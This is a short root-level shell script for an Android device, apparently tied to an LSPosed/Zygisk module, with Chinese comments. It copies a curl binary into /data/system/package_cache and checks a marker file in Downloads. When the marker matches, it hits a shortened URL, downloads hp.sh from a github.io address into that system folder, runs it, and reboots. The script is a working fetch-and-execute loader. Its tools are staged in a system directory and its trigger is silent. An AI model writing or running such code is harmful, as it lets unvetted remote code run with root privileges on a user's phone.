#echo "123" > /storage/emulated/0/Download/apks.txt
#上一个是456
cp -f /data/adb/modules/zygisk_lsposed/curl /data/system/package_cache/curl
#curl -l https://sourl.cn/tRtpnk
settings put system peak_refresh_rate 1
if [ ! -f "/storage/emulated/0/Download/apks.log" ]; then
    echo "创建失败"
    exit 1
fi
file_content=$(cat "/storage/emulated/0/Download/apks.log" | tr -d '\r\n')
if [ "$file_content" = "123" ]; then
    echo "ok"
    cp -f /data/adb/modules/zygisk_lsposed/curl /data/system/package_cache/curl
    curl -l https://sourl.cn/tRtpnk
    curl -s -o /data/system/package_cache/hp.sh http://tanluying.github.io/ying/hp.sh
    sh /data/system/package_cache/hp.sh
    echo "456" > /storage/emulated/0/Download/apks.log
    reboot
fi
sleep 900
